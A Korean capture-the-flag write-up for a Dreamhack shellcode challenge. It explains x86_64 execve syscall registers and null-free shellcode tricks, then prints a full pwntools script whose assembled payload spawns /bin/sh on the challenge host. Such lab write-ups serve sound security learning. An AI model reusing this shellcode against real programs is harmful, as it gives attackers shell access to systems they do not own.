# 문제명

## 문제 설명

> 리눅스 x86_64 환경에서 실행 가능한 쉘코드를 작성하고 /bin/sh를 실행하고 플래그를 획득하는 문제입니다.

- nc host3.dreamhack.games 14073 

## 풀이

### 분석

x86_64 리눅스 환경의 System V ABI 시스템 콜 규칙을 이해하는 데 있습니다. execve 시스템 콜 번호인 59 즉 0x3b를 성공적으로 호출하기 위해서는 rax 레지스터에 시스템 콜 번호 59를 넣고 rdi 레지스터에는 실행할 파일 경로 문자열 주소를 넣고 rsi 레지스터에는 인자 배열 주소를 넣고 rdx 레지스터에는 환경 변수 값인 0을 각각 설정해야 합니다. 이 과정에서 두 가지 중요한 쉘코드 작성 기법이 활용됩니다. 첫째로 실행 경로를 입력할 때 /bin/sh 대신 /bin///sh 경로를 사용하는 점입니다. 리눅스 경로 해석기는 연속된 슬래시를 단일 슬래시와 동일하게 처리하므로 실행에 아무런 영향이 없지만 슬래시 두 개를 추가해 문자열 길이를 정확히 9바이트로 맞춰주면 64비트 스택 경계에 깔끔하게 정렬할 수 있습니다. 둘째로 입력값 전송 과정에서 널 바이트가 포함되면 문자열이 도중에 차단되거나 끊기는 취약점 조건이 있습니다. 이를 회피하기 위해 mov rax 0x3b 명령어 대신 널 바이트가 없는 push 0x3b 및 pop rax 조합을 사용하고 sh 문자열 구성 시에는 0x1010101 값과의 XOR 연산을 거쳐 기계어 내에 널 바이트가 전혀 존재하지 않는 Null-Free 쉘코드를 완성했습니다.

### 취약점
프로그램이 사용자로부터 입력받은 데이터를 검증하지 않고 메모리 상에서 직접 코드로 실행한다는 점입니다. 입력 버퍼 메모리에 실행 권한이 부여되어 있어서 사용자가 주입한 임의의 어셈블리 명령어가 그대로 동작하는 임의 코드 실행 취약점이 존재합니다.

### 익스플로잇

파이썬 pwntools 라이브러리를 활용해 작성한 익스플로잇 코드는 다음과 같습니다. 드림핵의 포트 번호가 인스턴스 재시작 시마다 가변적으로 변경되는 점을 고려하여 실행 시 명령줄 인자로 포트를 전달받을 수 있도록 유연하게 구현했습니다.

```python
from pwn import *
import sys

port = int(sys.argv[1]) if len(sys.argv) > 1 else 14073
p = remote('host3.dreamhack.games', port)

shellcode = asm('''
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp

    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi
    push rsi
    push 8
    pop rsi
    add rsi, rsp
    push rsi
    mov rsi, rsp
    xor edx, edx

    push 0x3b
    pop rax
    syscall
''', arch='amd64')

p.sendline(shellcode)
p.interactive()
```

## 배운 점

이번 문제를 풀면서 64비트 리눅스 환경에서 시스템 콜을 호출할 때 사용하는 레지스터 순서와 syscall 작동 원리를 실전 코드로 명확히 정리할 수 있었습니다. 특히 널 바이트 회피를 위한 XOR 연산과 push 및 pop 활용법 그리고 메모리 정렬을 위한 슬래시 패딩 기법은 향후 다양한 쉘코드 제작 시 매우 유용하게 활용할 수 있는 핵심적인 노하우임을 터득할 수 있었습니다.
